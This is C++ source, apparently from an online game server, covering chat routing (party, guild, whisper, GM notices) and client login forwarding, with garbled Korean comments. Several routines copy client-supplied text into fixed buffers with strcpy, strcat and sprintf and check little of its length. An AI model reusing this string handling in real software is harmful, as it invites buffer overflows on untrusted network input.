#ifdef UNICODE_MODE_20050718
	char szTempMsg[4096] = {0,};
	
	MultiByteToWideChar(DEFAULT_CODEPAGE, 0, (char*)szChat, len, (WCHAR*)szTempMsg, sizeof(szTempMsg));
#ifdef MODIFY_VIETNAM_MEMCPY_BUG_20060502
	memcpy(pMsg.chatmsg, szTempMsg, sizeof(pMsg.chatmsg));
	PHeadSetB((LPBYTE)&pMsg, 0x01, sizeof(pMsg)-MAX_CHAT+wcslen((WCHAR*)pMsg.chatmsg)*2+2);	
#else		
	PHeadSetB((LPBYTE)&pMsg, 0x01, sizeof(pMsg)-MAX_CHAT+wcslen((WCHAR*)pMsg.chatmsg)*2+2);	
	memcpy(pMsg.chatmsg, szTempMsg, sizeof(pMsg.chatmsg));
#endif
	
	pMsg.chatmsg[MAX_CHAT-2] = 0;
	pMsg.chatmsg[MAX_CHAT-1] = 0;
	pMsg.NumberH = HIBYTE(lpObj->m_Index);
	pMsg.NumberL = LOBYTE(lpObj->m_Index);
#else
	PHeadSetB((LPBYTE)&pMsg, 0x01, sizeof(pMsg)-MAX_CHAT+len+1);
	strcpy(pMsg.chatmsg, szChat);
	pMsg.NumberH = HIBYTE(lpObj->m_Index);
	pMsg.NumberL = LOBYTE(lpObj->m_Index);
	pMsg.chatmsg[len+1] = '\0';
#endif
	DataSend(senduser, (LPBYTE)&pMsg, pMsg.h.size);
}


void PChatProc(LPPMSG_CHATDATA lpChat, short aIndex)
{	
	int n;
	LPOBJECTSTRUCT	lpObj = &gObj[aIndex];
	int	number;

#ifdef UNICODE_MODE_20050718
	int slen = wcslen((WCHAR*)lpChat->chatmsg);
#else
	int slen = strlen(lpChat->chatmsg);
#endif
	char szId[MAX_IDSTRING+1];

	if( slen < 1 ) return;
	//if( PacketCheckTime(lpObj) == FALSE ) return;


#ifdef PREVENT_117_CHATTING_MSG_BUG_20051114
	if( slen > MAX_CHAT - 1 )
	{
		LogAddTD("[Anti-HACK][PChatProc][%s][%s] Chat Message Len : %d", lpObj->AccountID, lpObj->Name, slen);
		return;
	}
#endif

	szId[MAX_IDSTRING] = '\0';
	memcpy(szId, gObj[aIndex].Name, MAX_IDSTRING);
	memcpy(lpChat->chatid, szId, MAX_IDSTRING);

	CHAT_LOG_DATA	pChatMsg;	
	int				szTargetNameCount = 0;

	if( gWriteChatLog )
	{
		pChatMsg.h.c = PMHC_BYTE;
		pChatMsg.h.headcode = 0x02;

		memcpy(pChatMsg.AccountID, gObj[aIndex].AccountID, MAX_IDSTRING);
		memcpy(pChatMsg.Name, gObj[aIndex].Name, MAX_IDSTRING);
		pChatMsg.AccountID[MAX_IDSTRING] = NULL;
		pChatMsg.Name[MAX_IDSTRING] = NULL;
		pChatMsg.wServer = gGameServerCode;

		pChatMsg.btType = 0xFF;
	}

	switch( lpChat->chatmsg[0] )
	{
	case '!' :	// ����
		if( slen > 2 
#ifdef UNICODE_MODE_20050718
			&& lpChat->chatmsg[1] == 0x00
#endif
			)
		{
//			if( (lpObj->AuthorityCode&AUTHORITY_CODE_NOTICE) == AUTHORITY_CODE_NOTICE )
//#ifdef GMCOMMAND_EX_1ST_BUGFIX
			if(CheckAuthority(AUTHORITY_EVENT_GM | AUTHORITY_SUPER_ADMIN | AUTHORITY_ADMIN, lpObj) == true)
//#else
//			if(CheckAuthority(AUTHORITY_EVENT_GM | AUTHORITY_SUPER_ADMIN, lpObj) == true)
//#endif // GMCOMMAND_EX_1ST_BUGFIX
			{
				DataSend(aIndex, (LPBYTE)lpChat, lpChat->h.size);

				char szGlobalMsg[255];

				ZeroMemory(szGlobalMsg,sizeof(szGlobalMsg));
				
#ifdef UNICODE_MODE_20050718
				PMSG_NOTICE	pNotice;
				TNotice::MakeNoticeMsgUnicode( &pNotice, 0, lpChat->chatmsg+2, MAX_CHAT-2);

				for( int n=ALLOC_USEROBJECTSTART; n<MAX_OBJECT; n++)
				{
					if( gObj[n].Connected == 3 && (gObj[n].Type == OBJTYPE_CHARACTER) )
					{
						DataSend(n, (LPBYTE)&pNotice, pNotice.h.size);
					}
				}
//				LogAddTD(lMsg.Get(471), gObj[aIndex].AccountID, gObj[aIndex].Name, szCmdMsg);
#else
				if(g_GlobalConfig.m_bGlobalNick == TRUE)
				{
					sprintf(szGlobalMsg,"[%s]: ",gObj[aIndex].Name);
				}

				strcat(szGlobalMsg,lpChat->chatmsg+1);

				AllSendServerMsg(szGlobalMsg);
				LogAddTD(lMsg.Get(471), gObj[aIndex].AccountID, gObj[aIndex].Name, lpChat->chatmsg+1);
#endif

				if( gWriteChatLog )
				{
					memcpy(pChatMsg.szChatMsg, lpChat->chatmsg+1, MAX_CHAT-1);
					pChatMsg.szChatMsg[MAX_CHAT] = NULL;
					pChatMsg.btType = 3;	// ����
				}
				return;
			}
			else
			{
				g_PostSystem.SendPostMessage(aIndex,&lpChat->chatmsg[1]);
				return;
			}
		}
		break;

			
#if TESTSERVER == 1
	case '`' :	// ����
		if( slen > 2 
#ifdef UNICODE_MODE_20050718
			&& lpChat->chatmsg[1] == 0x00
#endif
			)
		{
#ifdef UNICODE_MODE_20050718
			if( lpChat->chatmsg[2] == '!' && lpChat->chatmsg[3] == 0x00 )	// ĳ�� �����̴�.
#else
			if( lpChat->chatmsg[1] == '!' )	// ĳ�� �����̴�.
#endif
			{
//				DataSend(aIndex, (LPBYTE)lpChat, lpChat->h.size);
				AllSendServerMsg(lpChat->chatmsg+2);
				LogAddTD(lMsg.Get(471), gObj[aIndex].AccountID, gObj[aIndex].Name, lpChat->chatmsg+1);
				
				if( gWriteChatLog )
				{
					memcpy(pChatMsg.szChatMsg, lpChat->chatmsg+1, MAX_CHAT-1);
					pChatMsg.szChatMsg[MAX_CHAT] = NULL;
					pChatMsg.btType = 3;	// ����
				}
				return;
			}
		}
		break;
#endif
		
	case '/' :	// ��ɾ�
		if( slen > 2 
#ifdef UNICODE_MODE_20050718
			&& lpChat->chatmsg[1] == 0x00
#endif
			)
		{
#ifndef PCBANG_FREE_KALIMA_EVENT_20060124
			if ((strcmp(&lpChat->chatmsg[1], "�̵� Į����") == 0)
	#if defined(FOR_TAIWAN) && defined(PCBANG_ADVANTAGE)
				|| (stricmp(&lpChat->chatmsg[1], "move kalima") == 0) 
	#endif
				)
			{			
			#ifdef HAPPY_POUCH
				if (lpObj->m_lFreeKalimaTime)
				{				
					if (gMoveCommand.MoveFree2Kalima(lpObj))
					{
						//##LOG�߰� happycat@20050214
						LogAddTD("[%s][%s] Use [/�̵� Į����] POUCH", lpObj->AccountID, lpObj->Name);
						return;
					}
				}
			#endif//HAPPY_POUCH
			#ifdef PCBANG_ADVANTAGE
				#ifdef PCBANG_ADVANTAGE_EXPAND_20060919
				if( IsOKPCBangBenefitAll(lpObj) )
				#else
				if (lpObj->m_bPCBangUser)
				#endif // PCBANG_ADVANTAGE_EXPAND_20060919
				{				
					if (gMoveCommand.MoveFree2Kalima(lpObj))
					{
						//##LOG�߰� happycat@20050214
						LogAddTD("[%s][%s] Use [/�̵� Į����] PCBANG", lpObj->AccountID, lpObj->Name);
						return;
					}
				}
			#endif
			}
			 gs_cmd.ChatRecv(lpChat,aIndex);
#endif
				//PICKUP
	#ifdef PICKUP_SYSTEM
			//if (!memcmp(lpChat->chatmsg, "/pickup", strlen("/pickup")))
			//	s_PickUp.IsPickAddCommand(lpObj, lpChat);

			//if (!memcmp(lpChat->chatmsg, "/picklist", strlen("/picklist")))
			//	s_PickUp.IsPickList(lpObj);

#endif
			//if( (lpObj->Authority&AUTHORITY_USER) != AUTHORITY_USER )	// ������ �ƴϸ� �ϴ� � ��ɾ �õ��Ѵ�.
			{
#ifdef UPDATE_PK_SYSTEM_20070302	// ������� �����߿��� ���̵��� �� �� ����
#ifdef MODIFY_SELFDEFENSETIME_MAXSELFDEFIENSE_20071221	// ������� �ð� 60��
				if( GetTickCount()-lpObj->MySelfDefenseTime  < (1000*60) )
#else	// MODIFY_SELFDEFENSETIME_MAXSELFDEFIENSE_20071221
				if( GetTickCount()-lpObj->MySelfDefenseTime  < (1000*90) )
#endif	// MODIFY_SELFDEFENSETIME_MAXSELFDEFIENSE_20071221
				{
					GCServerMsgStringSend(lMsg.Get(1133), lpObj->m_Index, 1);
					return;
				}
#endif

#ifdef UNICODE_MODE_20050718
				char szCmdMsg[4096] = {0,};
				WideCharToMultiByte(DEFAULT_CODEPAGE, 0, (WCHAR*)lpChat->chatmsg, slen, szCmdMsg, sizeof(szCmdMsg), NULL, NULL);
				cManager.ManagementProc(lpObj, szCmdMsg, aIndex);
#else
				cManager.ManagementProc(lpObj, lpChat->chatmsg, aIndex);
#endif
				return;
			}
		}
		break;
	}


#ifdef DARKLORD_WORK
	if( lpObj->ChatLitmitTime > 0 )
	{
		// ä�� ����:���� �ð� %d��
		MsgOutput(lpObj->m_Index,lMsg.Get(1247), lpObj->ChatLitmitTime);
		return;
	}
#endif

	// ä�� �������..
	if( (lpObj->Penalty&CTLCODE_CHATBAN) == CTLCODE_CHATBAN ) return;

#ifdef FOR_JAPAN
	if( (lpChat->chatmsg[0] == '~' || lpChat->chatmsg[0] == ']' )
#ifdef UNICODE_MODE_20050718
		&& lpChat->chatmsg[1] == 0x00
#endif
		)	// ��Ƽ ��ȭ
#else
	if( lpChat->chatmsg[0] == '~' 
#ifdef UNICODE_MODE_20050718
		&& lpChat->chatmsg[1] == 0x00
#endif
		)	// ��Ƽ ��ȭ
#endif
	{
		if( lpObj->PartyNumber >= 0 )
		{
			int partycount = gParty.GetPartyCount(lpObj->PartyNumber);
			if( partycount >= 0 )
			{
				if( gWriteChatLog )
				{
#ifdef UNICODE_MODE_20050718
					memcpy(pChatMsg.szChatMsg, lpChat->chatmsg+2, MAX_CHAT-2);
					pChatMsg.szChatMsg[MAX_CHAT-1] = '\0';
					pChatMsg.szChatMsg[MAX_CHAT] = '\0';
#else
					memcpy(pChatMsg.szChatMsg, lpChat->chatmsg+1, MAX_CHAT-1);
					pChatMsg.szChatMsg[MAX_CHAT] = NULL;
#endif
					pChatMsg.btType = 1;	// ��Ƽ ��ȭ
				}

				for( n=0; n<MAX_PARTYUSER; n++)
				{
					number = gParty.m_PartyS[lpObj->PartyNumber].Number[n];
					if( number >= 0 )
					{
						DataSend(number, (LPBYTE)lpChat, lpChat->h.size);

						if( gWriteChatLog )
						{
							strcpy(pChatMsg.szTargetName[szTargetNameCount], gObj[number].Name);
							szTargetNameCount++;
						}
					}
				}
			}
		}
	}
	else if( lpChat->chatmsg[0] == '@' 
#ifdef UNICODE_MODE_20050718
		&& lpChat->chatmsg[1] == 0x00
#endif
		)	// ��� ��ȭ
	{
		//DataSend(aIndex, (char*)lpChat, lpChat->h.size);
		if( lpObj->GuildNumber > 0 )	// ��� �ΰ�?
		{
			// 1. > ��� ���� �̴�.
#ifdef UNICODE_MODE_20050718
			if( lpChat->chatmsg[2] == '>' && lpChat->chatmsg[3] == 0x00 )
#else
			if( lpChat->chatmsg[1] == '>' )	// ��� ���� �̴�.
#endif
			{
				if( lpObj->Name[0] == lpObj->lpGuild->Names[0][0] )
				{
					if( strcmp(lpObj->Name, lpObj->lpGuild->Names[0] ) == 0 )	// �渶 �϶��� ����
					{
#ifdef UNICODE_MODE_20050718
						GDGuildNoticeSave(lpObj->lpGuild->Name, lpChat->chatmsg+4);
#elif defined(_NEW_EXDB_)
						GDGuildNoticeSave(lpObj->lpGuild->Name, lpChat->chatmsg+2);
						LogAdd(lMsg.Get(472),lpObj->lpGuild->Name, lpChat->chatmsg);
#endif

						if( gWriteChatLog )
						{
#ifdef UNICODE_MODE_20050718
							memcpy(pChatMsg.szChatMsg, lpChat->chatmsg+4, MAX_CHAT-4);
							pChatMsg.szChatMsg[MAX_CHAT-1] = '\0';
							pChatMsg.szChatMsg[MAX_CHAT] = '\0';
#else
							memcpy(pChatMsg.szChatMsg, lpChat->chatmsg+2, MAX_CHAT-2);
							pChatMsg.szChatMsg[MAX_CHAT] = NULL;
#endif
							pChatMsg.btType = 4;	// ������
						}
					}
				}
			}

#ifdef ADD_UNION_CHATTING_01_20041201
			// 2. > ���� ä���̴�.
#ifdef UNICODE_MODE_20050718
			else if( lpChat->chatmsg[2] == '@' && lpChat->chatmsg[3] == 0x00 && (lpObj->lpGuild->iGuildUnion!=G_RELATIONSHIP_NONE) )
#else
			else if( lpChat->chatmsg[1] == '@' && (lpObj->lpGuild->iGuildUnion!=G_RELATIONSHIP_NONE) )	
#endif
			{
				INT iGuildCount = 0;
				INT iGuildList[MAX_RELATIONSHIP_COUNT] = { 0, };

				if( UnionManager.GetGuildUnionMemberList( lpObj->lpGuild->iGuildUnion, iGuildCount, iGuildList ) == 1 )
				{
					for( INT i=0; i<iGuildCount; i++ )
					{
						LPGUILD_INFO lpGuildInfo = Guild.SearchGuild_Number(iGuildList[i]);

						if( lpGuildInfo == NULL )
							continue;

						for( n=0; n<MAX_GUILD; n++)
						{
							if( lpGuildInfo->Use[n] )
							{
								number = lpGuildInfo->Index[n];

								if( number >= 0 )
								{
									if( lpGuildInfo->Names[n][0] ==  gObj[number].Name[0] )
									{
										if( strcmp(lpGuildInfo->Names[n], gObj[number].Name) == 0 )
										{
											DataSend(number, (LPBYTE)lpChat, lpChat->h.size);
										}
									} 

								}

							}
						}
					}		
				}
				
#ifdef ADD_SERVERGROUP_CHATTING_FOR_GUILD_UNION_01_20050706
				// 2.1 > ���� ä���� ExDB ������ �����Ѵ�.
				if( g_iServerGroupUnionChatting == 1 )
					GDUnionServerGroupChattingSend( lpObj->lpGuild->iGuildUnion, lpChat );
#endif 


			}
#endif // ADD_UNION_CHATTING_01_20041201


			// 3. > ��� ä���̴�.
			else
			{
				int count = lpObj->lpGuild->Count;
				if( count >= 0 )
				{
					for( n=0; n<MAX_GUILD; n++)
					{
						if( lpObj->lpGuild->Use[n] )
						{
							number = lpObj->lpGuild->Index[n];
							if( number >= 0 )
							{
								if( lpObj->lpGuild->Names[n][0] ==  gObj[number].Name[0] )
								{
									if( strcmp(lpObj->lpGuild->Names[n], gObj[number].Name) == 0 )
									{
										DataSend(number, (LPBYTE)lpChat, lpChat->h.size);
										//LogAdd("%d %s �Կ��� ��� ��ȭ ���� ", number, gObj[number].Name);
									}
								}
							}
						}
					}
				}

#ifdef ADD_SERVERGROUP_CHATTING_FOR_GUILD_UNION_01_20050706
				// 3.1 > ��� ä���� ExDB ������ �����Ѵ�.
				if( g_iServerGroupGuildChatting == 1 )
				{
					// �������� 1�� �̻��� ���. ^^
					if( lpObj->lpGuild->Count > 1 )
						GDGuildServerGroupChattingSend( lpObj->lpGuild->Number, lpChat );
				}
#endif 

				if( gWriteChatLog )
				{
#ifdef UNICODE_MODE_20050718
					memcpy(pChatMsg.szChatMsg, lpChat->chatmsg+2, MAX_CHAT-2);
					pChatMsg.szChatMsg[MAX_CHAT-1] = '\0';
					pChatMsg.szChatMsg[MAX_CHAT] = '\0';
#else
					memcpy(pChatMsg.szChatMsg, lpChat->chatmsg+1, MAX_CHAT-1);
					pChatMsg.szChatMsg[MAX_CHAT] = NULL;
#endif
					pChatMsg.btType = 2;	// ���ä��
				}
			}

			if( gWriteChatLog )
			{
				strcpy(pChatMsg.szTargetName[szTargetNameCount], lpObj->GuildName);
				szTargetNameCount++;
			}
		}
	}	
	else
	{
#ifdef UPDATE_GM_FUNCTION_20070228	// GM �̰� ���� ���� �̸� ������ ����
	#ifdef MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
		if( ( ( lpObj->Authority & AUTHORITY_EVENT_GM ) == AUTHORITY_EVENT_GM )
	#ifdef MODIFY_BUFFSYSTEM_BUGFIX_05_20071220
			&& ( gObjCheckUsedBuffEffect( lpObj, BUFFTYPE_INVISABLE ) ) )
	#else
			&& ( gObjCheckUsedBuffEffect( lpObj, BUFFTYPE_GM_MARK ) ) )
	#endif // MODIFY_BUFFSYSTEM_BUGFIX_05_20071220

	#else
		if( ( (lpObj->Authority&AUTHORITY_EVENT_GM) == AUTHORITY_EVENT_GM ) 
			&& ( (lpObj->m_ViewSkillState&STATE_CLOAKING) == STATE_CLOAKING ) )
	#endif // MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
			return;
#endif
//		LogAdd("chat:%s] %s", gObj[aIndex].Name, lpChat->chatmsg);
#ifdef ADD_NEWPVP_PKFIELD
		// �����峻���� ���� ä�κ��� ä���� �����ϰ� �Ѵ�.
		if (g_NewPVP.IsDuel(*lpObj) || g_NewPVP.IsObserver(*lpObj))
		{
			g_NewPVP.ChatMsgSend(*lpObj, (LPBYTE)lpChat, lpChat->h.size);
		}
		else
		{
			DataSend(aIndex, (LPBYTE)lpChat, lpChat->h.size);
			MsgSendV2(lpObj, (LPBYTE)lpChat, lpChat->h.size);
		}
#else
		DataSend(aIndex, (LPBYTE)lpChat, lpChat->h.size);
		MsgSendV2(lpObj, (LPBYTE)lpChat, lpChat->h.size);
#endif // ADD_NEWPVP_PKFIELD

		if( gWriteChatLog )
		{
			memcpy(pChatMsg.szChatMsg, lpChat->chatmsg, MAX_CHAT);
			pChatMsg.szChatMsg[MAX_CHAT] = NULL;
			pChatMsg.btType = 0;	// �Ϲ�ä��
		}
	}

	if( gWriteChatLog )
	{
		if( pChatMsg.btType != 0xFF )
		{
			pChatMsg.btType |= (szTargetNameCount<<4);
			pChatMsg.h.size = sizeof(pChatMsg)-(5-szTargetNameCount)-1;
			if( gWriteChatLog )
				gSendHackLog.SendData((LPBYTE)&pChatMsg, pChatMsg.h.size);
		}
	}
}


void CGChatRecv(LPPMSG_CHATDATA_NUMBER lpMsg, int aIndex)
{
	LPOBJECTSTRUCT	lpObj = &gObj[aIndex];
	
	if( PacketCheckTime(lpObj) == FALSE ) return;

	DataSend(aIndex, (LPBYTE)lpMsg, lpMsg->h.size);
	MsgSendV2(lpObj, (LPBYTE)lpMsg, lpMsg->h.size);
}

// ���� �޽����� ������.
void GCServerMsgSend(BYTE msg, int aIndex)
{
	PMSG_SERVERMSG	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x0C, sizeof( pMsg ));

	pMsg.MsgNumber	= msg;
	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

// type  0 : �ϴܰ���
// 1 : ���� ����
void GCServerMsgStringSend(char *szMsg, int aIndex, BYTE type)
{
	PMSG_NOTICE	pNotice;
	
#ifdef MODIFY_NOTICE_20040325
	TNotice::MakeNoticeMsg( &pNotice, type, szMsg );
#else
	pNotice.type = type;
	strcpy(pNotice.Notice, szMsg);
	PHeadSetB((LPBYTE)&pNotice, 0x0D, 4+(strlen(pNotice.Notice)+1));
#endif

	DataSend(aIndex, (LPBYTE)&pNotice, pNotice.h.size);
}

#ifdef ADD_NEWPVP_PKFIELD
void GCServerMsgStringSendEx(int aIndex, BYTE type, char* szFormat, ...)
{
	char szTmp[512];

	va_list arglist;
	va_start(arglist, szFormat);
    vsprintf(szTmp, szFormat, arglist);
    va_end(arglist);

	GCServerMsgStringSend(szTmp, aIndex, type);
}
#endif // ADD_NEWPVP_PKFIELD

// ��忡 ���� �޽��� ������.
void GCServerMsgStringSendGuild(LPGUILD_INFO lpNode, char *szMsg, BYTE type)
{
	if( lpNode == NULL ) return;

	for( int n=0; n<MAX_GUILD; n++)
	{
		if( (lpNode->Use[n] > 0) && (lpNode->Index[n] >= 0) )
		{
			GCServerMsgStringSend(szMsg, lpNode->Index[n], type);
		}
	}
}

// 0x0B �̺�Ʈ ���¸� �˸���.
void GCEventStateSend(int aIndex, BYTE state, BYTE event)
{
	PMSG_EVENT	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x0B, sizeof( pMsg ));
	pMsg.Event		= event;
	pMsg.State      = state;
	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

// 0x0B �̺�Ʈ ���¸� �˸���.
void GCMapEventStateSend(int map, BYTE state, BYTE event)
{
	PMSG_EVENT	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x0B, sizeof( pMsg ));
	pMsg.Event		= event;
	pMsg.State      = state;

	for( int n=0; n<MAX_OBJECT; n++)
	{
		if( gObj[n].Connected == 3 && 
			gObj[n].Type == OBJTYPE_CHARACTER && 
			map == gObj[n].MapNumber )
		{
			DataSend(n, (LPBYTE)&pMsg, pMsg.h.size);
		}
	}
}

// �ӼӸ� ���
void CGChatWhisperRecv(LPPMSG_CHATDATA_WHISPER lpMsg, int aIndex)
{
	char tid[MAX_IDSTRING+1];
	PMSG_CHATDATA_WHISPER pWhisper;
	int  len;
	
	LPOBJECTSTRUCT	lpObj = &gObj[aIndex];

	if( PacketCheckTime(lpObj) == FALSE ) return;

#ifdef DARKLORD_WORK
	if( lpObj->ChatLitmitTime > 0 )
	{
		// ä�� ����:���� �ð� %d��
		MsgOutput(lpObj->m_Index,lMsg.Get(1247), lpObj->ChatLitmitTime);
		return;
	}
#endif

	// ä�� �������..
	if( (lpObj->Penalty&CTLCODE_CHATBAN) == CTLCODE_CHATBAN ) return;

	tid[MAX_IDSTRING] = '\0';
	memcpy(tid, lpMsg->id, MAX_IDSTRING);

	int index = WhisperCash.AddCash(tid);
	
	// ����ڰ� ���ٸ�..
	if( index < 0 )
	{
		GCServerMsgSend(0, aIndex);
	}
	else 
	{	// ����ڰ� �ִٸ� �޽����� ������.
		PHeadSetB((LPBYTE)&pWhisper, 0x02, sizeof( pWhisper ));
		strcpy(pWhisper.id, gObj[aIndex].Name);
		memcpy(pWhisper.chatmsg, lpMsg->chatmsg, MAX_CHAT);
#ifdef UNICODE_MODE_20050718
		pWhisper.chatmsg[MAX_CHAT-2] = '\0';
		pWhisper.chatmsg[MAX_CHAT-1] = '\0';
		len = wcslen((WCHAR*)pWhisper.chatmsg);
#else
		len = strlen(pWhisper.chatmsg);
#endif
		if( len > 0 )
		{
			pWhisper.h.size -= MAX_CHAT;
#ifdef UNICODE_MODE_20050718
			pWhisper.h.size += len*2+2;
			if (pWhisper.h.size > sizeof(PMSG_CHATDATA_WHISPER))
				pWhisper.h.size = sizeof(PMSG_CHATDATA_WHISPER);
#else
			pWhisper.h.size += len+1;
#endif
			DataSend(index, (LPBYTE)&pWhisper, pWhisper.h.size);

			CHAT_LOG_DATA	pChatMsg;			
			int				szTargetNameCount = 0;			

			if( gWriteChatLog )
			{
				pChatMsg.h.c = PMHC_BYTE;
				pChatMsg.h.headcode = 0x02;

				memcpy(pChatMsg.AccountID, gObj[aIndex].AccountID, MAX_IDSTRING);
				memcpy(pChatMsg.Name, gObj[aIndex].Name, MAX_IDSTRING);
				pChatMsg.AccountID[MAX_IDSTRING] = NULL;
				pChatMsg.Name[MAX_IDSTRING] = NULL;
				pChatMsg.wServer = gGameServerCode;

				memcpy(pChatMsg.szChatMsg, lpMsg->chatmsg, MAX_CHAT);
				pChatMsg.szChatMsg[MAX_CHAT] = NULL;
				pChatMsg.btType = 5;	// ��Ƽ ��ȭ

				strcpy(pChatMsg.szTargetName[szTargetNameCount], gObj[index].Name);
				szTargetNameCount++;
				
				if( szTargetNameCount != 0 )
				{
					pChatMsg.btType |= (szTargetNameCount<<4);				
				}

				pChatMsg.h.size = sizeof(pChatMsg);
				gSendHackLog.SendData((LPBYTE)&pChatMsg, pChatMsg.h.size);
			}
		}
	}
}

//----------------------------------------------------------------------------
// [0xF1][0x00] ������ Ŭ���̾�Ʈ���� ���� ����� �˸���.
//----------------------------------------------------------------------------
void SCPJoinResultSend( int aIndex, BYTE result )
{
	PMSG_JOINRESULT	pResult;

	memset(&pResult, 0, sizeof(pResult));
	pResult.h.size     = sizeof(pResult);
	pResult.h.c		   = PMHC_BYTE;
	pResult.h.headcode = 0xF1;
	pResult.scode      = 0x00;
	pResult.result     = result;
	pResult.NumberH    = HIBYTE(aIndex);
	pResult.NumberL    = LOBYTE(aIndex);
	pResult.CliVersion[0] = szClientVersion[0];
	pResult.CliVersion[1] = szClientVersion[1];
	pResult.CliVersion[2] = szClientVersion[2];
	pResult.CliVersion[3] = szClientVersion[3];
	pResult.CliVersion[4] = szClientVersion[4];
	
	
	DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

	gObj[aIndex].ConnectCheckTime = GetTickCount();	
}

//----------------------------------------------------------------------------
// [0xF1][0x01]
// ��������(JoinServer)�� ����� ���� ������ ������ ������û�Ѵ�.
//----------------------------------------------------------------------------
void CSPJoinIdPassRequest(LPPMSG_IDPASS lpMsg, int aIndex)
{
	BYTE serial[17];
	char id[MAX_IDSTRING+1];

	// ���� ���� üũ
	if( (lpMsg->CliVersion[0] != szClientVersion[0]) ||
		(lpMsg->CliVersion[1] != szClientVersion[1]) ||
		(lpMsg->CliVersion[2] != szClientVersion[2]) ||
		(lpMsg->CliVersion[3] != szClientVersion[3]) ||
		(lpMsg->CliVersion[4] != szClientVersion[4]) )
	{
		LogAddC(LOGC_PURPLE, "JOIN ERROR - VERSION: %s SERIAL: %s", lpMsg->CliVersion, lpMsg->CliSerial);
		GCJoinResult(0x06, aIndex);
		CloseClient ( aIndex );
		return;
	}

	serial[16] = '\0';
	memcpy(serial, lpMsg->CliSerial, 16);

	id[MAX_IDSTRING] = '\0';
	memcpy(id, lpMsg->Id, MAX_IDSTRING);
	BuxConvert(id, MAX_IDSTRING);
	
#if ( LOCALCONNECT == 0 )
	// ���� ���� �ø��� ��ȣ�� �´��� üũ
	if( strcmp((char*)serial, szGameServerExeSerial) != 0 )
	{		
		LogAddC(LOGC_RED,"error-L1: Serial error [%s] [%s]", id, serial);
		GCJoinResult(0x06, aIndex);
		CloseClient ( aIndex );
		return;
	}
#endif

	if( bCanConnectMember == 1 )
	{
		if( ConMember.IsMember(id) == FALSE )
		{
			GCJoinResult(0x02, aIndex);
			return;
		}
	}

	LPOBJECTSTRUCT	lpObj = &gObj[aIndex];
	if( PacketCheckTime(lpObj) == FALSE ) // �ð��� �ʰ��Ǿ���..
	{
		LogAdd(lMsg.Get(473), aIndex, id);
		CloseClient ( aIndex );
		return;
	}
	//DevGamesX 01/05/2018 - OffExp
	OffExp.Close(id);
	OFFSystem.Closeoffafk(id);
	OFFtrade.Closeofftrade(id);


	if( gObj[aIndex].Connected != CSS_LOGIN ) 
	{
		LogAdd(lMsg.Get(474), aIndex, id);
		CloseClient ( aIndex );
		return;
	}
	if( gObj[aIndex].LoginMsgSnd != 0 )
	{
		if( gObj[aIndex].LoginMsgSnd == 1 )
		{
			LogAdd(lMsg.Get(475), aIndex, id, gObj[aIndex].Ip_addr);
		}
		else {
			LogAdd("error : %d %s %d",gObj[aIndex].LoginMsgSnd, __FILE__, __LINE__);
		}
		return;
	}
	SDHP_IDPASS	spMsg;

	PHeadSetB((LPBYTE)&spMsg, 0x01, sizeof( spMsg ));

	spMsg.Number     = aIndex;
	memcpy(spMsg.Id,   lpMsg->Id,   MAX_IDSTRING);
#ifdef PW_KUZIMO
	memcpy(spMsg.Pass, lpMsg->Pass, MAX_IDSTRING);//MAX_PASSWORD_LENGTH);
#else
	memcpy(spMsg.Pass, lpMsg->Pass, MAX_IDSTRING);
#endif
	strcpy(spMsg.IpAddress, gObj[aIndex].Ip_addr);


#if (TESTSERVER==1)
	// ���� �׽�Ʈ�� �� ������ IP�� �Ҵ��ؾ� �� ��쿡�� ����Ѵ�.
	//strcpy(spMsg.IpAddress, "61.35.132.2");
#endif
	
	gObj[aIndex].CheckTick				 = lpMsg->TickCount;
	gObj[aIndex].CheckTick2				 = GetTickCount();
	gObj[aIndex].ConnectCheckTime		 = GetTickCount();
	gObj[aIndex].CheckSpeedHack			 = 1;
	gObj[aIndex].ConnectCheckTime 		 = GetTickCount();
	gObj[aIndex].LoginMsgSnd			 = 1;
	gObj[aIndex].LoginMsgCount++;
	gObj[aIndex].AccountID[MAX_IDSTRING] = '\0';
	memcpy(gObj[aIndex].AccountID, id, MAX_IDSTRING);

	gObj[aIndex].m_cAccountItemBlock = FALSE;

#ifdef FOR_THAILAND	
	gObj[aIndex].m_AuthAdult = 0;
	gObj[aIndex].m_DisplayTeenLogOutMsg = FALSE;
#endif
	
#ifdef ADD_PROTOCOL_PCBANG_GUID	
	gObj[aIndex].PcBangGuid = 0;
#endif
	wsJServerCli.DataSend((char*)&spMsg, spMsg.h.size);
	LogAddTD("join send : (%d)%s", aIndex, gObj[aIndex].AccountID);
	
#ifdef MAP_SERVER_WORK_20041030			// �ʼ��� �̵��� �ʿ��� ����� ������
	lpObj->m_bMapSvrMoveReq				= false;
	lpObj->m_sPrevMapSvrCode			= -1;
	lpObj->m_sDestMapNumber				= -1;
	lpObj->m_btDestX					= 0;
	lpObj->m_btDestY					= 0;
#endif

#ifdef CHN_PLAYTIME_LIMIT_SYSTEM_20050818
	lpObj->m_iPlayTimeLimit				= 0;
	lpObj->m_iPlayNoticeTick			= 0;
	lpObj->m_dwPlayTick					= GetTickCount();
#endif
	
#ifdef VTM_PLAYTIME_LIMIT_SYSTEM_20060626
	lpObj->m_iPlayTimeLimit				= 0;
	lpObj->m_iPlayRestTime				= 0;
	lpObj->m_iPlayNoticeTick			= 0;
	lpObj->m_dwPlayTick					= GetTickCount();
#endif
}

//----------------------------------------------------------------------------
// [0xF1][0x01]
// ��������(JoinServer)�� ����� ���� ������ ������ ������û�Ѵ�.
//----------------------------------------------------------------------------

int logincounttest=0;
int ltesttime=0;

void CSPJoinIdPassRequestTEST(LPPMSG_IDPASS lpMsg, int aIndex)
{
	char szId[MAX_IDSTRING+1];
	char szPass[MAX_IDSTRING+1];

	LPOBJECTSTRUCT	lpObj = &gObj[aIndex];

	SDHP_IDPASS	spMsg;

	PHeadSetB((LPBYTE)&spMsg, 0x11, sizeof( spMsg ));

	spMsg.Number     = aIndex;

	wsprintf(szId, "������%d",logincounttest);
	wsprintf(szPass, "m321");
	
	LogAdd("login send : %s %s", szId, szPass);

